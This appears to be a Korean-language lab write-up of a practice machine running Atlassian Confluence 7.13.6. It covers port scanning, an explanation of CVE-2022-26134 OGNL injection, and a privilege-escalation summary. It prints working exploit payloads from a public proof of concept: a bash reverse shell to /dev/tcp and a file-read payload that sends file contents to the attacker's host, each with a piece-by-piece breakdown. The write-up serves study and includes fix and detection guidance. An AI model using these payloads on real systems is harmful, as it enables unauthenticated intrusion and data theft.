---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/ssti
  - tech/enum/searchsploit
  - tech/payload/revshell
  - tech/lin/cron
type: machine
platform: pg
os: linux
ip: 192.168.103.41
ports: [22, 8090, 8091]
services: [http, ssh]
cves: [CVE-2022-26134]
status: solved
manual_tags: true
manual_cves: true
manual_ports: true
manual_services: true
tech_count: 4
---

> [!info] 요약
> 타겟 `192.168.103.41` · Ubuntu 23.04 (kernel 6.2.0-39-generic) · Intermediate · 플래그 2개
> 진입점: 8090 Atlassian Confluence **7.13.6** → **CVE-2022-26134**(URI 경로 세그먼트 OGNL 주입 → Nashorn → `ProcessBuilder`) 미인증 RCE → `confluence` 계정 리버스셸
> 권한상승: root 개인 crontab 이 1분마다 도는 `/opt/log-backup.sh` 가 `confluence` 소유 → SUID bash 한 줄 추가
> ⚠️ **두 세션이 겹침** — 1차(2026-07-14, `192.168.103.41`)는 foothold 까지, 2차(2026-08-20, `192.168.248.41`)는 권한상승 전부. 박스를 다시 켜면서 IP 가 바뀜. **인용문 안의 IP 는 그 실행 시점의 실측이라 그대로 둠**
> 시행착오·교훈 → [[_PLAYBOOK]]

> [!warning] 「셸 잡은 뒤」 구간의 기록 사정
> 1차 세션은 `nc` 리버스셸 안에서 친 명령이 **하나도 남지 않았음** — `~/.zsh_history` 는 Kali 로컬 대화형 셸의 기록이라 원격 셸 내부를 담지 않음.
> 그래서 2차 세션은 tmux 페인을 통째로 떠 `~/PG/Flu/privesc_session.log`(25,813바이트)로 남겼고 `Privilege Escalation` 절의 모든 블록이 거기서 나옴.
> 그 로그는 tmux 캡처라 **80열에서 하드랩**돼 있고 TTY 부재로 명령이 두 번씩 에코됨. 노트에 옮기며 한 것은 셋뿐임 — ① 하드랩 줄바꿈 되붙이기 ② 중복 에코 줄 제거 ③ 구분자용 `echo ===MARKER` 제거. **출력 문자열 자체는 고치지 않았고, 길어서 잘라낸 곳은 `...` 로 표시했음.**

## Target #1 – 192.168.103.41

### Initial Access – 미인증 Confluence 7.13.6 의 URI 경로 OGNL 주입이 서비스 계정 RCE 로 이어짐

**Vulnerability Explanation:** CVE-2022-26134 — Confluence Server/Data Center 의 URI 경로 세그먼트가 OGNL 표현식으로 평가됨.
- 경로 세그먼트가 액션 네임스페이스로 파싱되며 검증 없이 OGNL 평가 컨텍스트로 흘러듦 = **표현식 주입(SSTI)의 Java 판**
- OGNL 은 프로퍼티 접근기가 아니라 완전한 표현식 언어 — 메서드 호출·정적 클래스 참조·객체 생성이 전부 됨. 입력이 평가 컨텍스트에 닿는 것 자체가 임의 코드 실행
- 라우팅·네임스페이스 해석이 인증 필터보다 **앞**에서 일어나므로 미인증. 로그인 화면밖에 못 보는 상태에서 그대로 터짐
- 얻는 권한은 서비스 실행 계정(`confluence`)이고 root 아님

**Vulnerability Fix:**
- 7.4.17 / 7.13.7 / 7.14.3 / 7.15.2 / 7.16.4 / 7.17.4 / 7.18.1 이상으로 패치. 타겟 7.13.6 은 **7.13.7 바로 직전** — 마이너 하나 차이로 열려 있었음
- 8090 관리 인터페이스를 VPN·내부망 뒤에 둘 것. 미인증 결함은 노출면이 곧 공격면임
- 아웃바운드 이그레스 필터링 — 이 익스플로잇은 리버스셸이든 파일 읽기든 타겟이 밖으로 TCP 를 열어야 성립함
- 탐지 — 액세스 로그 URI 의 `%24%7B`(`${`)·`Class.forName`, 비정상적으로 긴 경로 세그먼트

**Severity:** Critical — 무인증 원격 RCE

**Steps to reproduce the attack:**
1. `-p-` 스캔 → 8090 에서 `http-title: Log In - Confluence`
2. 로그인 페이지 푸터에서 버전 7.13.6 확정
3. CVE-2022-26134 PoC `jbaines-r7/through_the_wire` 클론
4. `--read-file /etc/passwd` 로 RCE 를 먼저 증명(네트워크 변수 분리)
5. `--reverse-shell` 로 `confluence` 계정 대화형 셸 획득
6. `/home/confluence/local.txt` 읽기

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.103.41 | TCP: 22, 8090, 8091 |

`nnmap` 은 오타가 아니라 별칭임. `~/.zshrc:247` 정의:

```text
alias nnmap='nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log'
```

| 플래그 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `-p-` | 65535 포트 전부 | 8090·8091 이 둘 다 top-1000 밖이라 기본 스캔으로는 SSH 만 보임. 박스가 통째로 사라짐 |
| `-sCV` | 기본 NSE + 버전 탐지 | `http-title: Log In - Confluence` 가 안 나옴. 포트만 보고 제품을 못 맞힘 |
| `-Pn` | 핑 스킵 | ICMP 차단 호스트를 "down" 으로 버림 |
| `--min-rate 5000` | 초당 최소 패킷 | 이 스캔이 129초에 끝난 이유. 없으면 `-p-` 가 수십 분 |
| `-oN nmap.log` | 결과 파일 | 나중에 대조할 1차 사료가 사라짐 |

```bash
┌──(kali㉿kali)-[~/PG/Flu]
└─$ nnmap 192.168.103.41
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-14 13:51 +0900
Nmap scan report for 192.168.103.41
Host is up (0.085s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 02:79:64:84:da:12:97:23:77:8a:3a:60:20:96:ee:cf (ECDSA)
|_  256 dd:49:a3:89:d7:57:ca:92:f0:6c:fe:59:a6:24:cc:87 (ED25519)
8090/tcp open  http     Apache Tomcat (language: en)
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Log In - Confluence
|_Requested resource was /login.action?os_destination=%2Findex.action&permissionViolation=true
8091/tcp open  jamlink?
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 204 No Content
|     Server: Aleph/0.4.6
|     Date: Tue, 14 Jul 2026 04:52:41 GMT
|     Connection: Close
|   GetRequest:
|     HTTP/1.1 204 No Content
|     Server: Aleph/0.4.6
|     Date: Tue, 14 Jul 2026 04:52:09 GMT
|     Connection: Close
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Tue, 14 Jul 2026 04:52:09 GMT
|     Connection: Close
|     content-length: 0
|   Help, Kerberos, LDAPSearchReq, LPDString, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 414 Request-URI Too Long
|     text is empty (possibly HTTP/0.9)
|   RTSPRequest:
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Tue, 14 Jul 2026 04:52:10 GMT
|     Connection: Keep-Alive
|     content-length: 0
|   SIPOptions:
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Tue, 14 Jul 2026 04:52:47 GMT
|     Connection: Keep-Alive
|_    content-length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8091-TCP:V=7.98%I=7%D=7/14%Time=6A55C079%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,68,"HTTP/1\.1\x20204\x20No\x20Content\r\nServer:\x20Aleph/0\.4
SF:\.6\r\nDate:\x20Tue,\x2014\x20Jul\x202026\x2004:52:09\x20GMT\r\nConnect
SF:ion:\x20Close\r\n\r\n")%r(HTTPOptions,EC,"HTTP/1\.1\x20200\x20OK\r\nAcc
SF:ess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Max-Age:\x2031536000\
SF:r\nAccess-Control-Allow-Methods:\x20OPTIONS,\x20GET,\x20PUT,\x20POST\r\
SF:nServer:\x20Aleph/0\.4\.6\r\nDate:\x20Tue,\x2014\x20Jul\x202026\x2004:5
SF:2:09\x20GMT\r\nConnection:\x20Close\r\ncontent-length:\x200\r\n\r\n")%r
SF:(RTSPRequest,F1,"HTTP/1\.1\x20200\x20OK\r\nAccess-Control-Allow-Origin:
SF:\x20\*\r\nAccess-Control-Max-Age:\x2031536000\r\nAccess-Control-Allow-M
SF:ethods:\x20OPTIONS,\x20GET,\x20PUT,\x20POST\r\nServer:\x20Aleph/0\.4\.6
SF:\r\nDate:\x20Tue,\x2014\x20Jul\x202026\x2004:52:10\x20GMT\r\nConnection
SF::\x20Keep-Alive\r\ncontent-length:\x200\r\n\r\n")%r(Help,46,"HTTP/1\.1\
SF:x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x20\(po
SF:ssibly\x20HTTP/0\.9\)")%r(SSLSessionReq,46,"HTTP/1\.1\x20414\x20Request
SF:-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x20\(possibly\x20HTTP/0\
SF:.9\)")%r(TerminalServerCookie,46,"HTTP/1\.1\x20414\x20Request-URI\x20To
SF:o\x20Long\r\n\r\ntext\x20is\x20empty\x20\(possibly\x20HTTP/0\.9\)")%r(T
SF:LSSessionReq,46,"HTTP/1\.1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\n
SF:text\x20is\x20empty\x20\(possibly\x20HTTP/0\.9\)")%r(Kerberos,46,"HTTP/
SF:1\.1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x2
SF:0\(possibly\x20HTTP/0\.9\)")%r(FourOhFourRequest,68,"HTTP/1\.1\x20204\x
SF:20No\x20Content\r\nServer:\x20Aleph/0\.4\.6\r\nDate:\x20Tue,\x2014\x20J
SF:ul\x202026\x2004:52:41\x20GMT\r\nConnection:\x20Close\r\n\r\n")%r(LPDSt
SF:ring,46,"HTTP/1\.1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20
SF:is\x20empty\x20\(possibly\x20HTTP/0\.9\)")%r(LDAPSearchReq,46,"HTTP/1\.
SF:1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x20\(
SF:possibly\x20HTTP/0\.9\)")%r(SIPOptions,F1,"HTTP/1\.1\x20200\x20OK\r\nAc
SF:cess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Max-Age:\x2031536000
SF:\r\nAccess-Control-Allow-Methods:\x20OPTIONS,\x20GET,\x20PUT,\x20POST\r
SF:\nServer:\x20Aleph/0\.4\.6\r\nDate:\x20Tue,\x2014\x20Jul\x202026\x2004:
SF:52:47\x20GMT\r\nConnection:\x20Keep-Alive\r\ncontent-length:\x200\r\n\r
SF:\n");
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   85.01 ms 192.168.45.1
2   84.99 ms 192.168.45.254
3   84.63 ms 192.168.251.1
4   84.67 ms 192.168.103.41

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 129.25 seconds
```
— 출처: `~/PG/Flu/nmap.log`

2차 세션의 재스캔(`~/PG/Flu/nmap_new.log`)은 IP·타임스탬프 외에 **1차와 동일**함 — 포트 3개, 같은 버전.

이 출력에서 읽어야 할 세 줄:

1. `http-title: Log In - Confluence` — 제품 확정. Tomcat 은 껍데기이고 알맹이는 Confluence
2. `Requested resource was /login.action?...&permissionViolation=true` — `.action` 확장자는 **WebWork/Struts2 액션 매핑**. 이 한 글자가 「OGNL 표현식 엔진이 안에 있다」는 신호
3. `8091/tcp open jamlink?` — **뒤의 `?` 가 요점.** 아래 「`jamlink` 는 제품이 아니다」 참조

#### 버전 판정 — 출처가 다른 근거 셋

8090 로그인 페이지 푸터에 버전이 박혀 있음.

![[Pasted image 20260714140908.png]]

- **① 타겟 자신** — 로그인 페이지 푸터 `Atlassian Confluence에 의해 제공 7.13.6`. URL 바의 `192.168.103.41:8090/login.action` 도 같은 화면에 찍힘
- **② 익스플로잇 저자의 시험 환경** — 디스크의 `through_the_wire.py` 헤더가 `Version: All LTS <= 7.13.6 and all others <= 7.18.0`, `Tested on: 7.13.6 LTS / Ubuntu 20.04`
- **③ 제3자 실습 문서의 영향 버전 목록** — 검색으로 닿은 CVE-2022-26134 실습 저장소 문서가 취약 범위를 `1.3.0 -> 7.4.17` · `7.13.0 -> 7.13.7` · `7.14.0 -> 7.14.3` · `7.15.0 -> 7.15.2` · `7.16.0 -> 7.16.4` · `7.17.0 -> 7.17.4` · `7.18.0 -> 7.18.1` 로 나열. 7.13.6 이 두 번째 구간에 들어감. ⚠️ **벤더 어드바이저리가 아니라 제3자 문서임** — 최종 확인은 Atlassian 어드바이저리(`## 관련`)로 할 것

![[Pasted image 20260714141213.png]]

①②③ 이 **서로 다른 출처**임(타겟 자신 / PoC 저자 / 제3자 문서). 누적 교훈 「버전 판정은 독립 근거 2개」를 만족함 — [[Hub]]·[[Levram]] 참조.

nmap 의 OS 추정(`Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5`)은 **버릴 것.** SSH 배너 `OpenSSH 9.0p1 Ubuntu 1ubuntu8.5` 가 훨씬 강한 근거이고, `-p-` 에서 열린 포트가 3개뿐이라 OS 지문 표본이 빈약했음. 실제 커널은 2차 세션의 `uname -a` 로 **6.2.0-39-generic** 임이 확정됨.

#### `jamlink` 는 제품이 아니다 — 8091 의 정체

1차 세션 원본 노트는 *"다른 포트 `8090/tcp open jamlink` 검색 시 atlassian CVE 발견"* 이라고 적었음. **두 군데가 틀렸음** — `jamlink` 로 뜬 것은 8090 이 아니라 8091 이고, `jamlink` 는 제품명이 아님.

Kali 의 `nmap-services` 표를 직접 열어 확인:

```bash
ssh kali@10.44.44.128 "grep -E '^\S+\s+809[01]/tcp' /usr/share/nmap/nmap-services"
opsmessaging	8090/tcp	0.000304	# Vehicle to station messaging
jamlink	8091/tcp	0.000000	# Jam Link Framework
```

> [!danger] nmap 의 SERVICE 열은 두 가지가 섞여 나옴
> - **지문 식별 성공** → 실제 제품명 (예: `ssh  OpenSSH 9.0p1 Ubuntu 1ubuntu8.5`)
> - **지문 식별 실패** → `nmap-services` 표에서 포트 번호로 조회한 이름 + `?`
>
> `8091/tcp open jamlink?` 의 `?` 가 그것임. 게다가 빈도값이 `0.000000` — 실측 표본에서 사실상 관측된 적 없는 항목이라는 뜻.
> **`?` 가 붙은 SERVICE 이름으로 exploit-db 를 검색하는 것은 포트 번호표를 검색하는 것과 같음.**
>
> 진짜 단서는 그 아래 `fingerprint-strings` 에 있음 — `Server: Aleph/0.4.6`. Aleph 는 Clojure 의 비동기 HTTP 서버 라이브러리이지 제품이 아님.

⚠️ **그럼에도 이 박스에서 CVE 로 이어진 실제 경로는 `jamlink` 문자열 검색이었음.** `8091/tcp open jamlink` 를 통째로 웹 검색하니 CVE-2022-26134 실습 저장소 문서가 상위에 떴음 — `nmap` 출력 한 줄을 그대로 붙여 넣은 검색이 **포트 번호표 이름 때문이 아니라 나머지 문맥 때문에** 맞은 것임.

![[Pasted image 20260714141017.png]]

**결과가 맞았다고 절차가 맞은 것은 아님** — 같은 검색을 `searchsploit jamlink` 로 돌렸을 때는 0건이었음. 재현 가능한 절차는 위 콜아웃대로 `fingerprint-strings` 의 배너(`Aleph`)와 8090 의 `http-title`(`Confluence`)에서 검색어를 뽑는 것임.

**8091 의 정체는 셸을 잡은 뒤에야 확정됐음** — `ss -lntup` + `ps` 로 `synchrony.core`(Confluence 협업 편집 백엔드)임이 드러남. 같은 `confluence` 계정으로 돌아 권한상승 경로가 아니었음. 실측 블록은 `Privilege Escalation` 절의 열거 구간에 있음.

`204 No Content` 만 돌려주는 API 이고 CORS 가 `*` 로 열려 있어(`OPTIONS, GET, PUT, POST`) 밖에서는 열거할 표면이 없었음 — 존재하는 경로와 없는 경로의 응답이 구분되지 않아 디렉터리 브루트포싱으로도 티가 안 남.

**22 (OpenSSH 9.0p1)** — 자격증명이 없어 손댈 것이 없었음. 셸 획득 후 `/home/confluence/.ssh/` 는 존재하지 않았고 `.bash_history` 는 `cd`·`ls -alh`·`exit` 세 줄뿐이었음(출처: `~/PG/Flu/privesc_session.log`).

**포트 80 이 없음** — 웹 열거의 습관대로 80 을 때리려다 없다는 것을 확인하는 데 시간을 쓸 수 있음. `-p-` 결과를 먼저 읽을 것.

### Initial Access – Confluence OGNL 경로 주입 → `confluence` 셸

#### 배경 — OGNL 이 왜 그대로 RCE 인가

**OGNL(Object-Graph Navigation Language)** — Java 객체 그래프를 문자열 표현식으로 탐색·조작하는 언어. Struts2 와 Atlassian 의 WebWork 가 뷰 계층에서 씀. 템플릿에 `${user.name}` 이라 쓰면 런타임에 `getUser().getName()` 이 호출되는 식.

문제는 단순 프로퍼티 접근기가 아니라 **완전한 표현식 언어**라는 것 — 메서드 호출(`.getMethod(...).invoke(...)`), 정적 클래스 참조(`Class.forName(...)`), 객체 생성이 전부 됨. 사용자 입력이 OGNL 평가 컨텍스트에 도달하면 그 자체로 임의 코드 실행임.

Jinja2 의 `{{ ''.__class__.__mro__[1].__subclasses__() }}`, Freemarker 의 `<#assign x=...Execute()>`, SpEL 의 `T(java.lang.Runtime).getRuntime().exec(...)` 와 **같은 사고**임 — 렌더링 엔진이 「데이터」로 받아야 할 것을 「코드」로 평가함.

데이터 흐름:

```text
GET /${OGNL 표현식}/  HTTP/1.1
      └─ 경로 세그먼트
         → 액션 네임스페이스로 파싱
           → OGNL 평가 컨텍스트에 진입          ← 여기가 결함
             → Class.forName(...) 등 임의 호출 성립
```

인증이 필요 없다는 점이 핵심임 — 라우팅·네임스페이스 해석이 인증 필터보다 앞에서 일어남. 스캔에서 본 `permissionViolation=true` 리다이렉트는 방어가 아니라 **아직 도달하지 않은 단계**였을 뿐임.

> [!warning] 익스플로잇 자신의 CVE 표기가 틀려 있음
> 디스크의 `through_the_wire.py` 헤더에는 `# CVE : CVE-2022-26123` 이라고 적혀 있는데 같은 파일의 배너는 `CVE-2022-26134` 를 출력함. **헤더 쪽이 오타임.**
> 저자가 붙인 참조는 벤더·NVD 판정이 아님.

#### 페이로드를 조각내어 읽기

`through_the_wire.py` 가 만드는 리버스셸 페이로드 원문(디스크의 소스에서 그대로 옮긴 것):

```python
exploit = '${Class.forName("com.opensymphony.webwork.ServletActionContext").getMethod("getResponse",null).invoke(null,null).setHeader("", Class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command(\'bash\',\'-c\',\'bash -i >& /dev/tcp/' + args.lhost + '/' + str(args.lport) + ' 0>&1\').start()"))}'
```
— 출처: `~/PG/Flu/through_the_wire/through_the_wire.py`

| 조각 | 역할 | 왜 필요한가 |
|---|---|---|
| `${ ... }` | OGNL 평가 마커 | 없으면 그냥 존재하지 않는 경로 → 404 |
| `Class.forName("com.opensymphony.webwork.ServletActionContext")` | WebWork 의 정적 컨텍스트 홀더 획득 | OGNL 컨텍스트에서 현재 HTTP 응답 객체에 손을 뻗는 표준 통로 |
| `.getMethod("getResponse",null).invoke(null,null)` | 리플렉션으로 `HttpServletResponse` 획득 | 직접 호출이 막혀도 리플렉션은 통과 |
| `.setHeader("", ...)` | 결과를 버리는 곳 | 실행이 목적이고 값은 불필요. 빈 헤더명에 넣어 조용히 버림 |
| `getEngineByName("nashorn").eval(...)` | JS 엔진으로 전환 | OGNL 문법으로 프로세스를 띄우는 것보다 JS 한 줄이 짧고 인용 충돌이 적음 |
| `new java.lang.ProcessBuilder().command('bash','-c','...')` | 실제 실행 | `Runtime.exec()` 와 달리 인자 배열을 직접 줌 — 공백·리다이렉션이 안 깨짐 |
| `bash -i >& /dev/tcp/LHOST/LPORT 0>&1` | 리버스셸 본체 | `bash -c` 로 감쌌기 때문에 `/dev/tcp` 가 동작함 |

> [!danger] `bash -c` 로 감싸는 것이 선택이 아니라 필수인 이유
> `/dev/tcp/HOST/PORT` 는 **커널의 장치 파일이 아니라 bash 가 내부에서 흉내 내는 가상 경로**임. bash 가 아닌 셸에는 존재하지 않음.
> `ProcessBuilder().command('bash','-i','>&','/dev/tcp/...')` 처럼 직접 넘기면 `>&` 가 **리다이렉션이 아니라 문자열 인자**가 되어 실패함. 셸 문법을 쓰려면 셸에게 파싱을 시켜야 하고, 그것이 `bash -c` 임.
> 같은 함정의 다른 얼굴은 [[Squid]]·[[Exfiltrated]] 의 「인용이 깨지면 인코딩으로 도망간다」 계열임.

페이로드는 URL 인코딩되어 경로에 붙음:

```python
encoded_exploit = urllib.parse.quote(exploit)
target_url = args.protocol + args.rhost + ':' + str(args.rport) + '/'
target_url += encoded_exploit
target_url += '/'
```

**뒤에 붙는 `/` 가 중요함.** 이것이 없으면 Confluence 의 액션 매핑이 이 문자열을 네임스페이스로 잘라내지 못함. 공개 분석들이 이 결함을 `/${...}/` 형태로 기술하는 이유임.

> [!warning] 그런데 `quote()` 는 슬래시를 인코딩하지 않음 — 흔한 오독의 정정
> 직관적으로는 *"페이로드가 완결된 하나의 경로 세그먼트로 인식된다"* 로 보이나 **틀림.**
> `urllib.parse.quote()` 의 `safe` 기본값은 `'/'` — 즉 **슬래시를 그대로 둠.** 아래 세 줄을 파일로 저장해 Kali 에서 돌려 확인:
>
> ```python
> import urllib.parse
> p = "${...eval('bash -i >& /dev/tcp/10.0.0.1/1270 0>&1')}"
> print(urllib.parse.quote(p))
> ```
>
> ```text
> %24%7B...eval%28%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.1/1270%200%3E%261%27%29%7D
> ```
> — 출처: 위 스크립트를 Kali 에서 `python3` 로 실행한 결과(타겟 아님)
>
> `%3E%26`(`>&`)·`%20`(공백)·`%24%7B`(`${`)는 인코딩됐는데 `/dev/tcp/10.0.0.1/1270` 의 슬래시는 살아 있음.
> 따라서 실제로 나가는 요청의 경로는 여러 세그먼트로 쪼개져 있음. `--read-file /etc/passwd` 도 마찬가지.
>
> [가정] 그럼에도 동작하는 이유는 Confluence 가 이 구간을 **세그먼트 단위가 아니라 문자열 단위로** OGNL 평가에 넘기기 때문으로 보임. 타겟이 정지돼 요청·응답을 직접 확인하지는 못했음. 관측된 사실은 「이 형태로 보냈고 실행됐다」까지임.
>
> 실전 함의 — 손으로 재현할 때 `--data-urlencode` 나 `quote(p, safe='')` 처럼 **슬래시까지 인코딩하면 오히려 실패할 수 있음.** 원본 스크립트와 같은 인코딩 수준을 유지할 것. [[Squid]]·[[Hawat]] 의 「인용이 깨지면 인코딩으로 도망간다」와 **반대 방향**의 교훈임 — 여기서는 과잉 인코딩이 문제임.

**수동 대안(자동 도구 없이)** — PoC 스크립트 없이 손으로 하려면 위 OGNL 문자열을 URL 인코딩해 `curl --path-as-is` 로 경로에 붙여 보내면 됨. **닫는 `/` 를 빠뜨리지 말 것.** 이 박스에서 손으로 재현하지는 않았음(관측 없음).

#### 파일 읽기 페이로드는 구조가 다르다

`--read-file` 을 주면 같은 껍데기 안의 JS 만 갈아 끼움:

```python
exploit = '${... .eval("var data = new java.lang.String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(\'' + args.read_file + '\')));var sock = new java.net.Socket(\'' + args.lhost + '\', ' + str(args.lport) + '); var output = new java.io.BufferedWriter(new java.io.OutputStreamWriter(sock.getOutputStream())); output.write(data); output.flush(); sock.close();"))}'
```
— 출처: `~/PG/Flu/through_the_wire/through_the_wire.py`

즉 **파일을 HTTP 응답으로 돌려주지 않음.** 타겟이 Kali 로 별도의 TCP 연결을 새로 열어 내용을 밀어 넣음. 그래서 리스너가 반드시 있어야 하고 스크립트가 알아서 `nc` 를 포크함.

> [!danger] 실행 순서가 실패 모드를 결정함
> JS 를 순서대로 볼 것 — **`readAllBytes()` 가 먼저이고 `new java.net.Socket()` 이 그다음임.**
> 따라서 **읽기 권한이 없으면 소켓이 아예 만들어지지 않음.** 리스너는 연결조차 못 받고 조용히 앉아 있음.
>
> 「아무것도 안 왔다」가 뜻하는 것:
> - ❌ 「파일이 없다」 (아님)
> - ❌ 「익스플로잇이 안 통한다」 (아님)
> - ✅ **「읽으려다 예외가 났다」** — 십중팔구 권한 부족
>
> 「응답이 성공을 뜻하지 않는다」의 거울상임 — 여기서는 **무응답이 실패를 뜻하지도 않음.** 무응답은 그저 정보가 없다는 뜻임.

#### argparse 기본값 — 안 주면 어디로 가는가

디스크의 소스에서 그대로 읽은 정의:

```python
parser.add_argument('--rport', ..., type=int, default="443")
parser.add_argument('--lport', ..., type=int, default="1270")
parser.add_argument('--protocol', ..., default="https://")
parser.add_argument('--fork-nc', action="store_true", dest="fork_nc", default=True, ...)
parser.add_argument('--nc-path', ..., default="/usr/bin/nc")
```

같은 파서를 떼어내 Kali 에서 직접 돌려 기본값을 확인:

```bash
ssh kali@10.44.44.128 "python3 /tmp/argtest.py --rhost 1.2.3.4 --lhost 5.6.7.8 --read-file /etc/passwd"
Namespace(rhost='1.2.3.4', rport=443, lhost='5.6.7.8', lport=1270, protocol='https://', reverse_shell=False, fork_nc=True, ncpath='/usr/bin/nc', read_file='/etc/passwd')
```
— 출처: `/tmp/argtest.py`(원본 파서를 발췌해 재현한 것. 타겟이 아니라 Kali 에서 돌린 것임)

> [!warning] 그래서 `--rport 8090` 과 `--protocol http://` 는 둘 다 필수임
> 안 주면 `https://192.168.103.41:443/` 로 던짐. 그 포트는 **열려 있지도 않음**(`-p-` 스캔에 없음).
> 그러면 `requests.get()` 이 예외를 내고 스크립트는 `[-] The HTTP request failed` 만 찍고 끝남 — **「익스플로잇이 안 통하는 박스」로 오판하기 딱 좋은 실패 모드임.**

> [!note] `--fork-nc` 는 끌 수 없음 (소스상의 버그)
> `action="store_true"` 인데 `default=True` — 즉 **플래그를 줘도 True, 안 줘도 True** 라 아무리 해도 `False` 가 되지 않음.
> 결과적으로 **스크립트가 항상 `nc -lvnp 1270` 을 포크함.** 별도 리스너를 미리 띄워 두면 포트 충돌이 남.
> 이 박스에서는 그냥 맡겨 뒀고, 실행 출력의 `listening on [any] 1270 ...` 이 포크가 실제로 동작했음을 보여줌.

#### 왜 하필 `nashorn` 인가 — 이 익스플로잇의 숨은 전제

페이로드는 OGNL 안에서 곧바로 프로세스를 띄우지 않고 JS 엔진을 한 번 경유함:

```text
getEngineByName("nashorn").eval("new java.lang.ProcessBuilder()...")
```

**Nashorn** 은 JDK 8 에 들어온 자바스크립트 엔진임. `javax.script.ScriptEngineManager` 로 이름만 대면 꺼내 쓸 수 있고 JS 코드에서 `java.*` 클래스를 그대로 부를 수 있음. 이유는 둘:

1. **인용 계층이 줄어듦** — OGNL 만으로 `ProcessBuilder` 에 문자열 배열을 넘기려면 OGNL 배열 문법과 이스케이프가 겹겹이 쌓임. JS 한 줄이 훨씬 짧음
2. **OGNL 샌드박스 우회의 고전 패턴** — Confluence·Struts2 는 OGNL 컨텍스트에 블랙리스트를 걸어 왔는데, `ScriptEngineManager` 를 거치면 평가 주체가 바뀌어 그 목록을 비껴감

> [!warning] 그래서 이 익스플로잇에는 Java 버전 전제가 붙음
> Nashorn 은 JDK 11 에서 deprecated(JEP 335), JDK 15 에서 제거됨(JEP 372). 제거된 런타임에서는 `getEngineByName("nashorn")` 이 `null` 을 반환하고 그 뒤의 `.eval(...)` 이 NPE 로 죽음 — **결함은 그대로인데 페이로드만 불발함.**
>
> 2차 세션에서 셸을 잡고 확인 — **JDK 11.0.14.1.** 처음엔 `[가정]`(JDK 8 또는 11)으로만 남겨 뒀던 것이 실측으로 확정됨:
>
> ```bash
> confluence@flu:/opt/atlassian/confluence/bin$ /opt/atlassian/confluence/jre/bin/java -version
> openjdk version "11.0.14.1" 2022-02-08
> OpenJDK Runtime Environment Temurin-11.0.14.1+1 (build 11.0.14.1+1)
> OpenJDK 64-Bit Server VM Temurin-11.0.14.1+1 (build 11.0.14.1+1, mixed mode)
> ```
> — 출처: `~/PG/Flu/privesc_session.log`
>
> Nashorn 은 11 에서 **deprecated 이지만 아직 존재함.** 15 에서 제거됐으니 이 페이로드가 통한 것임.
> 그리고 이 JRE 는 **Confluence 가 번들로 들고 온 것**임(`/opt/atlassian/confluence/jre/`) — OS 의 `java` 와 무관함. `java -version` 을 `PATH` 로 치면 다른 답이 나올 수 있으니 프로세스가 실제로 쓰는 경로(`ps` 의 첫 인자)로 확인할 것.
>
> **같은 CVE 에 PoC 가 여럿이면 「페이로드가 무엇에 의존하는가」가 선택 기준임.** Nashorn 판이 불발하면 같은 OGNL 진입점에 다른 실행 수단을 얹으면 됨:
>
> | 실행 수단 | 전제 | 비고 |
> |---|---|---|
> | `nashorn` + `ProcessBuilder` | JDK ≤ 14 | 이 PoC |
> | OGNL 직접 `ProcessBuilder` | 없음 | 인용이 지저분해짐 |
> | `Runtime.getRuntime().exec()` | 없음 | 셸 문법을 못 씀. `bash -c` 배열로 감싸야 함 |
> | `javax.script` + `JavaScript`/`js` 이름 | GraalJS 탑재 시 | 최신 JDK 의 대체 엔진 |
>
> **「익스플로잇이 안 통한다」의 원인이 결함 부재가 아니라 페이로드 부적합일 수 있음.**

#### 익스플로잇 확보

로컬 `searchsploit` DB 에는 CVE-2022-26134 항목이 없음:

```bash
┌──(kali㉿kali)-[~/PG/Flu]
└─$ searchsploit atlassian 7.
-------------------------------------------------------------------- ---------------------------------
